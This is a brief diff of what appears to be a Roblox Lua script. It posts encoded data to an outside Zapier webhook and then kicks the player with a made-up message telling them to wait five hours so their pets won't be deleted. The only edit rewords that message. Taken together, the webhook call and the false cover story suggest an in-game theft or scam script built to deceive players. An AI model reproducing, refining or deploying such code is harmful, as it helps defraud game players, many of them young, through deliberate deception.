@@ -6,4 +6,4 @@ local url = "https://hooks.zapier.com/hooks/catch/12875243/bw00at2/"
 local data0 = {}
 local newdata0 = game:GetService'HttpService':JSONEncode(data0)
 game:HttpPost(url,newdata0)
-game.Players.LocalPlayer:Kick("Please wait 5h for your id's to randomise. This ensures your pet won't get deleted.")
+game.Players.LocalPlayer:Kick("Please wait 5h for your id's to randomise. This ensures your pet/-s won't get deleted.")
